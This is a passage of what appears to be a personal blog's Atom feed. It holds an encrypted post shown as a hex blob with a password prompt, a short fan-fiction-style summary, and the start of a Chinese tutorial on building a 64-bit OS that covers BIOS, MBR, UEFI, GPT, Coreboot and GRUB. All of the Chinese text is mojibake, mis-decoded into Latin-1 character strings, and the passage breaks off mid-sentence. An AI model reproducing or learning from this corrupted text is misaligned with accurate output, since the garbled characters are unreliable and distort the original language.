ab623f88ca06caff1b3c34078c763a6fe08af2ea9914c06fd6536504d6ae0d427ead76dff0e8e00415f7f18179149b120eee196a281b1c181b25964d33a8647ba9c845487bc9ce484d89ab61d990125648e9df470ac1febbb662f8bb3200b830c3322a448e3d0067aba53b5e4e64f04aff848d8e4feb3b5cb01f9bb67bb172c1b46d385a74d7e2dc54ce8dd8de09ac07f69996942158b384687cf80e63e6140782c44702851f8e05fc84b9bd3731ab289f405239ac8257140afcbd861197d6940a5bf2612520bdfe9ab39a0b074fb7148c68b4327df788499bc85fb979d1b5cbddcfb98105c9ecb2ab845cfff8ae63c8c9c021a4f5301087a02a83fd9d9af2c21ee5fc9e3f40085bb4deaa46e41e2d50a1b9123d550d8524e500ac0cd03e4271ccbd09277be7e62e76d5e15b418b477f0121191b6881d01b09206d6cfb0a361db54cd9d9fa17e0bdada825266b9604f447523b10fbdcb5f98f34123a7e61b9d2b73728157169baed6f291d4d7065377a21475a3f96060c3facdbffea7792fe4ef86758a6829b4b325bfc7c18390f2c215d6ee74292544152cbc6e99b05cbdfa5cd53912fc83fbc7bc7ed723c6a70da9796831b631f184e6ab8eec3b95e8c51b8054da3f1208a42b48a2097f05b783fee442f2adc2f26edd400e93a6133f10a4e4be03f8adf01f6f97f063590e663b22308d9a3bfa7ae8df656e422ce029a426eaa230e19b2bc97d08810134758333c11580bb3ca4dcfd490d33e0aa655b58b0e2baf896e8ee31f7fa6918a3619b2b13b507b7c3645ee9b0020cefb4c4e8dd658a6601073b008e5e7ba52cd65bb69425c30c1fad520a0c673f11af6254023af245b3c07b7049eb4f186daed5a5a3a6917c84125c49f2dcfac3239e98d4774ee89da93d0259720c8dc523597b07e1c7480d891b641d2d6d777c4c83024f02b469cc5bb039940d83878b44a568f5833b0d4ec43358394d268be73321c8c52dc575a84dc67ab09028a33bf7b1bd2cc43c4e9dc5cfcefc242f49c013b1a15469d74cc8d6fa5cdf6393bc65307ea703baebcde839fe9d3f9322b9199fe21c8e0e7525e587d662e5c330f269b1fd76d613103559c030e756e6f5cecfef9d6376e00c93ba791d86bc1d508b4f602bf72352</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">é¢˜ç›®è¿˜æ²¡å‡ºå¥½æ‰€ä»¥æš‚ä¸”è¯·ç­‰å¾…</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">ä¸ºä»€ä¹ˆè¦è®©æˆ‘å¿˜è®°å‘¢ æˆ‘ä»¬ä»¥å‰æ„Ÿæƒ…æ˜æ˜é‚£ä¹ˆå¥½ å¤§å®¶æ¯å¤©åœ¨ä¸€èµ·éƒ½å¾ˆå¼€å¿ƒ ç»“æœç°åœ¨å„å¥”ä¸œè¥¿ä»€ä¹ˆçš„è¿™å¤ªå¥‡æ€ªäº† ä½ ä¸æ˜¯è¯´ä¹å›¢æ˜¯å‘½è¿å…±åŒä½“å— æ±‚æ±‚ä½  æˆ‘æƒ³è®©crychicé‡æ–°å¼€å§‹ æˆ‘æƒ³æ‰¾å›å¤§å®¶é‚£æ®µå¿«ä¹çš„æ—¥å­ crychicæ²¡æœ‰ç»“æŸ æˆ‘ä¸€ç›´ä¸ºäº†å®ƒåœ¨åŠªåŠ›ç€ ç­‰ä¸€ä¸‹ ä¸è¦èµ° æˆ‘çœŸçš„å¾ˆå–œæ¬¢å¤§å®¶å¾ˆé‡è§†å¤§å®¶ æ±‚æ±‚ä½  â€â™€ï¸è¦æˆ‘æ€ä¹ˆåšä½ ä»¬æ‰è‚¯å›æ¥ â€â™€ï¸åªè¦æ˜¯æˆ‘èƒ½åšçš„æˆ‘ä»€ä¹ˆéƒ½æ„¿æ„åš â€â™€ï¸æˆ‘çœŸçš„</summary>
    
    
    
    <category term="PIECES" scheme="https://arttnba3.github.io/categories/PIECES/"/>
    
    
    <category term="ç¢ç¢å¿µ" scheme="https://arttnba3.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>ã€CODE.0x03ã€‘ç°ä»£ 64 ä½ OS å¼€å‘æ‰‹è®° Iï¼šUEFI å¯åŠ¨ã€GRUB å¼•å¯¼ã€Frame buffer æ–‡å­—è¾“å‡º</title>
    <link href="https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/"/>
    <id>https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/</id>
    <published>2023-11-29T12:21:47.000Z</published>
    <updated>2023-12-12T07:11:42.220Z</updated>
    
    <content type="html"><![CDATA[<p>é¥é¥é¢†å…ˆï¼é¥é¥é¢†å…ˆï¼é¥é¥é¢†å…ˆï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>å¾ˆä¹…ä»¥å‰åœ¨çŸ¥ä¹ä¸Šæ›¾ç»æœ‰è¿‡ä¸€ä¸ªâ€œç¨‹åºå‘˜çš„ä¸‰å¤§æµªæ¼«â€çš„è®²æ³•ï¼šã€Œç¼–è¯‘åŸç†ã€ã€ã€Œæ“ä½œç³»ç»Ÿã€ã€ã€Œå›¾å½¢å­¦ã€â€”â€”å½“ç„¶è¿™ä¸ªä¼¼ä¹æ˜¯æŸäº›çŸ¥åç­”ä¸»æœæ’°çš„å¹¶æ²¡æœ‰ä»»ä½•çš„ç”±å¤´ç¥å¿…è¯´æ³•ï¼Œç¬”è€…è‡ªå·±ä¹Ÿä¸è®¤ä¸ºæ‰€è°“çš„â€œç¨‹åºå‘˜çš„æµªæ¼«â€å°±ä»…æ˜¯è¿™å‡ ä¸ªä¸œè¥¿ï¼Œä½†å¯¹äºç¬”è€…è€Œè¨€ï¼Œâ€œè‡ªå·±åŠ¨æ‰‹ç¼–å†™ä¸€ä¸ªå¯ä»¥æ­£å¸¸è¿è¡Œçš„æ“ä½œç³»ç»Ÿâ€ç¡®ä¹æ˜¯ä¸€ä»¶<strong>éå¸¸ç‚«é…·çš„äº‹æƒ…</strong></p><p>ç¬”è€…æ­¤å‰åœ¨å¤§äºŒä¸‹å­¦æœŸçš„æ—¶å€™æ›¾å‚ç…§ã€Šæ“ä½œç³»ç»ŸçœŸè±¡è¿˜åŸã€‹ç¼–å†™è¿‡ä¸€ä¸ªéå¸¸ç®€é™‹çš„åªæœ‰æ‰“å°åŠŸèƒ½çš„ 32 ä½æ“ä½œç³»ç»Ÿâ€”â€”ä¸¥æ ¼æ¥è¯´ç¬”è€…ä»…ä»…å®Œæˆäº†ä¸€ä¸ªé«˜åº¦å®¢åˆ¶åŒ–çš„ boot loader åŠ ä¸Šä¸€ç‚¹ç‚¹çš„ kernelï¼ˆå› ä¸ºæ‡’è€Œä¸æ˜¯æ—¶é—´ä¸å¤Ÿï¼Œå¤©å¤©æ‘†çƒ‚èººå¹³æ‰“æ¸¸æˆğŸ˜¥ï¼‰ï¼Œä¹Ÿæ²¡æœ‰åœ¨çœŸæœºä¸Šæµ‹è¯•è¿‡ï¼Œå®Œå…¨ç®—ä¸ä¸Šä¸€ä¸ªèƒ½ç”¨çš„æ“ä½œç³»ç»Ÿï¼›åœ¨å¤§ä¸‰å¯’å‡æœŸé—´ç¬”è€…èŠ±äº†å°†è¿‘ä¸€å‘¨çš„æ—¶é—´<a href="https://arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/">åˆ·å®Œäº† MIT 6.828 çš„å‰å››ä¸ª lab</a>ï¼Œä½†é‚£ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è¯´ä¹Ÿå¹¶ä¸æ˜¯ç¬”è€…ä»é›¶å¼€å§‹å†™çš„ä¸€ä¸ªå†…æ ¸â€”â€”å¤§æ¡†æ¶åŸºæœ¬éƒ½æ˜¯ MIT æ­å¥½çš„ï¼Œç¬”è€…ä»…ä»…åªç”¨è¡¥è¶³éå¸¸å¾®å°çš„ä¸€éƒ¨åˆ†ï¼›åœ¨å¤§ä¸‰ä¸‹å­¦æœŸç¬”è€…æƒ³ä¸æ›¾ç»å–œæ¬¢è¿‡çš„å¦¹å­ä¸€èµ·å‚åŠ ä¸€ä¸ª<a href="https://os.educg.net/">å†™æ“ä½œç³»ç»Ÿå†…æ ¸çš„æ¯”èµ›</a>ï¼Œä½†æ˜¯ç”±äº<a href="https://arttnba3.cn/2022/10/28/PIECES-0X04-SHELL_OUTSIDE-4-XIANG_WAN/">ä¸€äº›ç¼˜æ•…</a>ç¬”è€…ä¸€ç›´æ‹–åˆ°äº†æ¯”èµ›ç»“æŸéƒ½è¿˜æ²¡æœ‰å¼€å§‹åŠ¨æ‰‹å†™ç¬¬ä¸€è¡Œä»£ç ï¼Œæœ€åä¹Ÿå°±ä¸äº†äº†ä¹‹äº†ï¼›åœ¨å¤§å››ä¸Šå­¦æœŸç¬”è€…åˆé‡æ–°å†™äº†ä¸€ä¸ª<a href="https://github.com/arttnba3/SumiOS">ç”¨ Grub2 å¼•å¯¼çš„ 64 ä½å†…æ ¸</a>ï¼Œä½†æ˜¯å†™å®Œå†…å­˜åˆ†é…ä¹‹åä¹Ÿçƒ‚å°¾äº† ğŸ˜…</p><blockquote><p>ä»”ç»†æƒ³æ¥å¯¹äºç¬”è€…æ¥è¯´ä¼¼ä¹å¾ˆå°‘å­˜åœ¨â€œä¸‡äº‹å¼€å¤´éš¾â€çš„é˜¶æ®µï¼Œä½†å¾€å¾€ä¸€åˆ‡äº‹ç‰©éƒ½ä¼šæ»‘å‘æ— åº•çš„å¤§å‘æ°¸ä¹…æ— æ³•å¡«ä¸Šï¼šï¼‰</p></blockquote><p>å› æ­¤è¶ç€ç°åœ¨æ—¶é—´å°šä¸”å……è¶³ï¼Œç¬”è€…æƒ³è¦<strong>çœŸæ­£åœ°ä»é›¶å†™ä¸€ä¸ªå¯ç”¨çš„ 64 ä½æ“ä½œç³»ç»Ÿå†…æ ¸</strong>ï¼Œç®—æ˜¯æ»¡è¶³è‡ªå·±å¤šå¹´æ¥çš„ä¸€ä¸ªæ¢¦æƒ³å§ï¼Œåå­—çš„è¯ç¬”è€…å†³å®šå« <code>ClosureOS</code> â€”â€”è¿™ä¸ªåå­—çš„ç”±æ¥æ¯”è¾ƒç®€å•ï¼Œç¬”è€…ä¸€ç›´å¾ˆéš¾æƒ³å‡ºæ¯”è¾ƒå¥½å¬çš„åå­—ï¼Œçœ‹äº†çœ‹å¸‚é¢ä¸Šæœ‰å„ç§æ“ä½œç³»ç»Ÿéƒ½å« <code>Open*</code> ï¼Œé‚£ç¬”è€…å°±å« <code>Close</code> å¥½äº†ï¼Œä½†æ˜¯ <code>Close</code> è¿™ä¸ªå•è¯é•¿å¾—åˆä¸å¥½çœ‹ï¼Œäºæ˜¯ç¬”è€…æœ€ç»ˆé€‰æ‹©äº† <code>Closure</code> ä½œä¸ºè¿™ä¸ªæ“ä½œç³»ç»Ÿçš„åå­—â€”â€”è™½ç„¶ä¼¼ä¹ä¸æ˜¯ç‰¹åˆ«å¥½å¬ï¼Œä½†åæ­£æ˜¯å¦èƒ½å†™å®Œéƒ½è¿˜æ˜¯ä¸ªæœªçŸ¥æ•°ï¼Œæ‰€ä»¥ä¹Ÿæ— æ‰€è°“äº†ï¼ˆç¬‘ï¼‰</p><p>æœ¬é¡¹ç›®ä»£ç å¼€æºåœ¨ <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><h1 id="0x01-Boot-Firmware"><a href="#0x01-Boot-Firmware" class="headerlink" title="0x01. Boot Firmware"></a>0x01. Boot Firmware</h1><p>ç°ä»£è®¡ç®—æœºçš„ä¸Šç”µè¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œä¸è¿‡å¯¹äºæ“ä½œç³»ç»Ÿå¼€å‘è€Œè¨€æˆ‘ä»¬å…¶å®åªéœ€è¦å…³æ³¨<strong>å½“æˆ‘ä»¬æŒ‰ä¸‹å¼€æœºé”®ä¹‹åæ‰€å‘ç”Ÿçš„äº‹æƒ…</strong>ï¼Œå®é™…ä¸Šæ— è®ºæ˜¯å¤è€çš„ Legacy BIOS å¯åŠ¨è¿˜æ˜¯é€æ¸æˆä¸ºä¸»æµçš„ UEFI å¯åŠ¨è€Œè¨€ï¼Œå…¶ä¸å¤–ä¹éƒ½éµå¾ªä»¥ä¸‹ä¸‰ä¸ªå¤§é˜¶æ®µï¼š</p><ul><li><strong>ROM Stage</strong>ï¼šç»å†äº†ä¸€äº›åŸºæœ¬çš„åˆå§‹åŒ–å·¥ä½œå CPU è¢«é‡ç½®ï¼Œä¸»æ ¸å¿ƒè¢«å”¤é†’ï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨æŒ‡å‘ <code>reset vector</code>ï¼ˆå›ºä»¶å…¥å£ç‚¹ï¼‰å¹¶ç”±æ­¤å¼€å§‹æ‰§è¡Œï¼Œæ­¤æ—¶å°šæœªè¿›è¡Œå†…å­˜æ¢æµ‹ï¼Œéœ€è¦ç›´æ¥åœ¨ ROM ä¸Šæ‰§è¡Œ</li><li><strong>RAM Stage</strong>ï¼šå†…å­˜æ¢æµ‹å®Œæˆï¼Œæ­¤æ—¶å¯ä»¥è¿›è¡Œä¸»æ¿ä¸Šå„èŠ¯ç‰‡ç»„ã€CPU ç­‰æ¨¡å—çš„åˆå§‹åŒ–ç­‰å·¥ä½œ</li><li><strong>Boot Stage</strong>ï¼šæ‰¾åˆ°å¯åŠ¨è®¾å¤‡ï¼Œå®Œæˆå¯åŠ¨è®¾å¤‡å‰çš„ä¾èµ–é¡¹çš„å‡†å¤‡ï¼Œå°†æ§åˆ¶æƒç§»äº¤ç»™è®¾å¤‡ä¸Šçš„ä¸‹ä¸€é˜¶æ®µçš„å¯åŠ¨å™¨</li></ul><p>ç°æœ‰çš„å›ºä»¶é€šå¸¸åˆ†ä¸ºä¸¤ç±»ï¼šBIOS ä¸ UEFI</p><h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><p><strong>åŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿ</strong>ï¼ˆ<strong>Basic Input&#x2F;Output System</strong>ï¼ŒBIOSï¼‰æ˜¯ç”¨æ¥ä¸ºè®¡ç®—æœºæä¾›åˆå§‹åŒ–æœåŠ¡ä¸è¿è¡Œæ—¶æœåŠ¡çš„ä¸€ç»„å›ºä»¶ï¼Œå…¶è¢«é¢„è£…åœ¨ä¸»æ¿çš„ ROM&#x2F;FLASH èŠ¯ç‰‡ä¸Šï¼Œä¸åŒçš„ BIOS é€šå¸¸ä»…èƒ½åœ¨ç‰¹å®šçš„ä¸»æ¿å‹å·ä¸Šè¿è¡Œ</p><p>å½“è®¡ç®—æœºå¯åŠ¨å BIOS ä¸ºç¬¬ä¸€ä¸ªè¢«è¿è¡Œçš„è½¯ä»¶ï¼Œæ­¤æ—¶è®¡ç®—æœºå¤„äºå®æ¨¡å¼ä¸‹ï¼Œä»…èƒ½è®¿é—® 1MB å†…å­˜çš„ç©ºé—´ï¼Œå…¶ä¸­ç‰©ç†å†…å­˜ <code>0xF0000 ~ 0xFFFFF</code> è¿™ 64KB ç©ºé—´è¢«æ˜ å°„åˆ° BIOS ROM å½“ä¸­ï¼Œå¹¶ä»¥ <code>0xFFFF0</code> å¤„ä½œä¸º BIOS ç¨‹åºçš„å…¥å£ç‚¹å¼€å§‹æ‰§è¡Œ</p><blockquote><p>å¯¹äºæ”¯æŒä¸”å¼€å¯äº† BIOS shadowing ç‰¹æ€§çš„è®¡ç®—æœºè€Œè¨€ï¼ŒBIOS ä¼šè¢«å…ˆä»å›ºä»¶å½“ä¸­æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œè€Œéç›´æ¥åœ¨ ROM ç©ºé—´ä¸Šæ‰§è¡Œ</p></blockquote><p>BIOS ä¼šä»å—æ¡¥çš„ CMOS èŠ¯ç‰‡ä¸­è¯»å– BIOS ç¨‹åºçš„è®¾ç½®å€¼ã€ç¡¬ä»¶å‚æ•°ä¾¦æµ‹å€¼ç­‰ä¿¡æ¯ï¼Œåœ¨å®ŒæˆåŠ ç”µè‡ªæ£€ã€è®¾å¤‡æµ‹è¯•ç­‰å·¥ä½œä¹‹åï¼Œä¼šä»å¯åŠ¨è®¾å¤‡ä¸­è¯»å–ç¬¬ä¸€ä¸ªæ‰‡åŒºåˆ°ç‰©ç†å†…å­˜ <code>0x7c00</code> çš„ä½ç½®ï¼Œè¯¥æ‰‡åŒºè¢«ç§°ä¸º<strong>ä¸»å¼•å¯¼è®°å½•</strong>ï¼ˆ<strong>Master Boot Recode</strong>ï¼ŒMBRï¼‰ï¼Œéšå BIOS ä¼šè·³è½¬åˆ° <code>0x7c00</code> å¤„ç»§ç»­æ‰§è¡Œï¼Œæ§åˆ¶æƒè½¬äº¤ç»™ MBR</p><p>MBR çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­<strong>ä¸ä»…åŒ…å«æœ‰ 440 å­—èŠ‚çš„ç¬¬ä¸€é˜¶æ®µå¼•å¯¼ä»£ç ï¼ŒåŒæ—¶è¿˜åŒ…å«æœ‰ç£ç›˜çš„åˆ†åŒºè¡¨ä¿¡æ¯</strong>ï¼ŒMBR ä»¥æœ«å°¾çš„ä¸¤ä¸ªå­—ç¬¦ <code>0x55, 0xaa</code> ä½œä¸ºå…¶æ ‡è¯†ï¼š</p><blockquote><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° MBR åˆ†åŒºè¡¨ä»…æ”¯æŒä¸è¶…è¿‡å››ä¸ªä¸»åˆ†åŒºï¼Œå¤šä½™çš„åˆ†åŒºåˆ™éœ€è¦ä¾èµ–æ“ä½œç³»ç»Ÿåœ¨å…¶ä¸Šå»ºç«‹è™šæ‹Ÿåˆ†åŒºï¼Œæ­¤å¤– MBR ä¹Ÿä¸æ”¯æŒç®¡ç†ç¡¬ç›˜ 2TB ä»¥å¤–çš„å­˜å‚¨ç©ºé—´ï¼Œå› æ­¤è¿™ç§åˆ†åŒºæ–¹å¼ <em>å…¶å®å·²ç»æ­£åœ¨é€æ¸åœ°è¢«æ·˜æ±°</em> </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113212038.png"></p><p>ç”±äº MBR ä»…æœ‰ 512 å­—èŠ‚ï¼Œæ— æ³•å®Œæˆè¿‡å¤šçš„ä»»åŠ¡ï¼Œå› æ­¤é€šå¸¸çš„è®¾è®¡æ˜¯ç”± MBR ä»ç¡¬ç›˜ä¸Šè¯»å–ç¬¬äºŒé˜¶æ®µçš„ boot loaderï¼Œç”±å…¶æ¥å®Œæˆåç»­çš„ç³»ç»Ÿç¯å¢ƒåˆå§‹åŒ–ã€è½½å…¥æ“ä½œç³»ç»Ÿå†…æ ¸ç­‰å·¥ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113211739.png"></p><h2 id="Unified-Extensible-Firmware-Interface"><a href="#Unified-Extensible-Firmware-Interface" class="headerlink" title="Unified Extensible Firmware Interface"></a>Unified Extensible Firmware Interface</h2><p><strong>ç»Ÿä¸€å¯æ‰©å±•å›ºä»¶æ¥å£</strong>ï¼ˆ<strong>Unified Extensible Firmware Interface</strong>ï¼ŒUEFIï¼‰ä¸ºä¸€å¥—<strong>å›ºä»¶æ¥å£è§„èŒƒï¼Œç”¨ä»¥åˆå§‹åŒ–ç¡¬ä»¶ã€å¼•å¯¼æ“ä½œç³»ç»Ÿï¼Œå¹¶å‘æ“ä½œç³»ç»Ÿæä¾›ä¸€å¥—ç»Ÿä¸€çš„åŠŸèƒ½æ¥å£ï¼Œè§£å†³ä¸åŒå‚ç‰Œ BIOS åˆ†è£‚çš„ç°çŠ¶</strong>ï¼Œå…¶æœ€åˆèµ·æºäº Intel å¼€å‘çš„ EFIï¼Œåœ¨ 2005 å¹´ç”± Intel äº¤ç”± UEFI è®ºå›è¿›è¡Œæ¨å¹¿ï¼Œ<strong>UEFI å›ºä»¶æœ¬è´¨ä¸Šä¸ BIOS å›ºä»¶æ²¡æœ‰åŒºåˆ«</strong>ï¼ˆéƒ½æ˜¯å°è£…åœ¨ ROM&#x2F;FLASH å›ºä»¶é‡Œçš„ç¨‹åºï¼‰</p><blockquote><p>ä¾‹å¦‚ BIOS å‚å•† A æä¾›çš„æŸä¸ªåŠŸèƒ½æ¥å£çš„ä½¿ç”¨æ–¹å¼æ˜¯ Xï¼ŒBIOS å‚å•† B æä¾›çš„ç›¸ä¼¼åŠŸèƒ½æ¥å£ä½¿ç”¨æ–¹å¼æ˜¯ Yï¼Œé‚£æ“ä½œç³»ç»Ÿå°±å¾—ä¸ºä¸åŒå‚å•†çš„ä¸åŒåŠŸèƒ½ç¼–å†™å¤šå¥—ä»£ç </p><p>è€Œæœ‰äº† UEFI è§„èŒƒï¼Œå‚å•† Aã€B çš„ UEFI å›ºä»¶éƒ½éœ€è¦å‘ä¸Šå±‚æä¾›ç»Ÿä¸€çš„æ¥å£ï¼Œä»è€Œä½¿å¾—æ“ä½œç³»ç»Ÿå¯ä»¥ç”¨ç›¸åŒçš„æ–¹å¼è°ƒç”¨æŸä¸ªåŠŸèƒ½ï¼Œé¿å…äº†ä»£ç åˆ†è£‚çš„æƒ…å†µ</p></blockquote><p>è¿™é‡Œå¼•ç”¨ä¸€å¼ éå¸¸ç»å…¸çš„å›¾ç‰‡ç®€è¿° UEFI å¯åŠ¨çš„åŸºæœ¬è¿‡ç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113191232.png"></p><p>ç›¸åº”åœ°ï¼ŒUEFI å¯åŠ¨ä¸å†ä½¿ç”¨è€æ—§çš„ MBR åˆ†åŒºè¡¨ï¼Œè€Œæ˜¯ä½¿ç”¨ <strong>GUID Partion Table</strong> ï¼ˆGPT åˆ†åŒºè¡¨ï¼‰ï¼Œä»¥ 512 å­—èŠ‚ä¸ºå•ä½ä½œä¸ºä¸€ä¸ª<strong>é€»è¾‘å—</strong>ï¼ˆLogic Blockï¼Œç›¸å¯¹åº”çš„åŒºå—åœ°å€ä¾¿ç§°ä¸º LBAï¼‰ï¼Œå‰ 34 ä¸ª LBA ç”¨æ¥è®°å½•åˆ†åŒºä¿¡æ¯ï¼Œå…¶ä¸­ LBA0 ä¸ºäº†å…¼å®¹æ€§ä¿ç•™ç»™ MBR ä½¿ç”¨ï¼ŒLBA1 è®°å½•åˆ†åŒºè¡¨è‡ªèº«çš„ä¿¡æ¯ã€å¤‡ä»½ç”¨ GPT åˆ†åŒºï¼ˆæœ€å 34 ä¸ª LBA çš„ä½ç½®ï¼‰ã€åˆ†åŒºçš„ CRC æ ¡éªŒç ç­‰ï¼ŒLBA2 ~ LBA 33 åˆ™ç”¨æ¥è®°å½•åˆ†åŒºä¿¡æ¯ï¼Œæ¯ä¸ª LBA å¯ä»¥è®°å½•å››ä¸ªæ¡ç›®ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129220808.png"></p><blockquote><h4 id="æ‰©å±•é˜…è¯»ï¼šå…¼å®¹æ”¯æŒæ¨¡å—ï¼ˆCompatibility-Support-Moduleï¼‰"><a href="#æ‰©å±•é˜…è¯»ï¼šå…¼å®¹æ”¯æŒæ¨¡å—ï¼ˆCompatibility-Support-Moduleï¼‰" class="headerlink" title="æ‰©å±•é˜…è¯»ï¼šå…¼å®¹æ”¯æŒæ¨¡å—ï¼ˆCompatibility Support Moduleï¼‰"></a>æ‰©å±•é˜…è¯»ï¼šå…¼å®¹æ”¯æŒæ¨¡å—ï¼ˆCompatibility Support Moduleï¼‰</h4><p>åœ¨ UEFI é€æ¸æ›¿æ¢æ‰è®¡ç®—æœºåº•å±‚å›ºä»¶çš„é£æ½®æ¶ŒåŠ¨ä¹‹æ—¶ï¼Œå°šæœ‰å¤§é‡çš„è®¾å¤‡ä»æ—§ä½¿ç”¨ä¼ ç»Ÿçš„ MBR åˆ†åŒºè¡¨ï¼Œä¸ºäº†è¿›è¡Œå…¼å®¹ï¼ŒCSM è¿™ä¸€å…¼å®¹æ”¯æŒæ¨¡å—ä¼šæ¨¡æ‹Ÿä¼ ç»Ÿ BIOS çš„åŠŸèƒ½ï¼Œä¸ºè¿™äº›è®¾å¤‡ç³»ç»ŸæŒ‰ç…§ä¼ ç»Ÿçš„ BIOS + MBR æ–¹å¼è¿›è¡Œå¼•å¯¼ï¼Œå¹¶æä¾›ä¼ ç»Ÿ BIOS çš„ 0x10 ç­‰ä¸­æ–­æœåŠ¡</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129203153.png"></p></blockquote><h2 id="Coreboot"><a href="#Coreboot" class="headerlink" title="Coreboot"></a><em>Coreboot</em></h2><p><strong>Coreboot</strong> èµ·æºäº <strong>LinuxBIOS</strong>ï¼Œæœ€åˆçš„æ€è·¯æ˜¯ <em>æ—¢ç„¶ Linux æœ‰æ¯”è¾ƒå¥½çš„ç¡¬ä»¶æ”¯æŒï¼Œé‚£è®¡ç®—æœºå¯åŠ¨ä»¥åç›´æ¥è·³ Linuxå°±å®Œäº‹äº†</em>  ï¼Œ äºæ˜¯ <em>ä½¿ç”¨ 20 è¡Œæ±‡ç¼–å®Œæˆåˆå§‹åŒ–å¹¶å°† Flash ä¸­çš„ Linux æ‹·è´è‡³å†…å­˜åç›´æ¥è·³è¿‡å»</em> çš„ LinuxBIOS è¯ç”Ÿäº 1999å¹´ï¼Œéšåç»è¿‡ä¸æ–­å‘å±•ï¼Œå¼•å¯¼ Linux æ‰€ç”¨çš„ç¨‹åºè¶Šæ¥è¶Šå¤§ï¼Œäºæ˜¯é¡¹ç›®åœ¨ 2008 å¹´æ”¹åä¸º corebootï¼Œé¡¹ç›®ç»“æ„å˜ä¸º <code>coreboot + payload</code>ï¼ŒLinux åˆ™æˆä¸ºäº† <em>å¯é€‰çš„ä¸€æ®µ payload</em> ï¼Œé€šè¿‡è¿™æ ·çš„æ¨¡å¼ï¼ŒCoreboot å¯ä»¥é€šè¿‡å¼•å…¥ä¸åŒçš„ payload æ¥æ”¯æŒå¤šç§ä¸åŒçš„å¯åŠ¨è§„èŒƒï¼ŒåŒ…æ‹¬ Legacy BIOS å’Œ UEFI</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129222934.png"></p><blockquote><p>ç›®å‰å¸‚é¢ä¸Šæ­£åœ¨ä½¿ç”¨ Coreboot çš„ä¸»æµäº§å“æœ‰ Google Chromebook å’Œ System76 æ——ä¸‹çš„ç¬”è®°æœ¬ç­‰</p></blockquote><h1 id="0x02-å¤šé‡å¼•å¯¼è§„èŒƒ-amp-GNU-GRUB"><a href="#0x02-å¤šé‡å¼•å¯¼è§„èŒƒ-amp-GNU-GRUB" class="headerlink" title="0x02. å¤šé‡å¼•å¯¼è§„èŒƒ &amp; GNU GRUB"></a>0x02. å¤šé‡å¼•å¯¼è§„èŒƒ &amp; GNU GRUB</h1><h2 id="Why-GRUBï¼Ÿ"><a href="#Why-GRUBï¼Ÿ" class="headerlink" title="Why GRUBï¼Ÿ"></a>Why GRUBï¼Ÿ</h2><p>ç°ä»Šçš„å¤§éƒ¨åˆ†æ‰€è°“â€œæ•™ä½ è‡ªè¡Œç¼–å†™æ“ä½œç³»ç»Ÿâ€çš„æ— è®ºæ˜¯æ•™ç¨‹ä¹Ÿå¥½ä¹¦ç±ä¹Ÿå¥½ï¼Œéƒ½å­˜åœ¨ç€ä¸€ä¸ªå°å°çš„é—®é¢˜ï¼š<strong>å¯¹ Legacy BIOS çš„å†…æ ¸å¼•å¯¼é˜¶æ®µå¤§ä¹¦ç‰¹ä¹¦</strong>â€”â€”è¯šç„¶ï¼Œäº†è§£ä¸€å°è®¡ç®—æœºä»å¯åŠ¨å¼€å§‹åˆ°å†…æ ¸çœŸæ­£è¿ä½œè¿™æ®µæœŸé—´çš„å®ç°ç»†èŠ‚æ— ç–‘æ˜¯ååˆ†é‡è¦çš„ä¸€ä»¶äº‹æƒ…ï¼Œå¯¹äºæ“ä½œç³»ç»Ÿå­¦ä¹ è€Œè¨€æˆ–è®¸ä¹Ÿæœ‰ä¸å°çš„å¸®åŠ©ï¼Œä½†å¾ˆå®¹æ˜“è®©åˆå­¦è€…é™·å…¥åˆ°ä¸å„ç§ç¡¬ä»¶åšå¼ˆçš„è‹¦æˆ˜å½“ä¸­ï¼ŒåŒæ—¶å¯¹äºå®é™…çš„å¼€å‘è€Œè¨€æ‰‹åŠ¨ç¼–å†™ä¸€ä¸ª<strong>ä»…é€‚ç”¨äºæˆ‘ä»¬è‡ªå·±çš„å†…æ ¸</strong>çš„å®¢åˆ¶åŒ– <code>MBR + boot loader</code> æ„ä¹‰å¹¶ä¸ç®—ç‰¹åˆ«å¤§</p><blockquote><p> <del>å†è¯´éƒ½ä»€ä¹ˆæ—¶ä»£äº†è¿˜åœ¨ç”¨ Legacy BIOSï¼ŒWintel 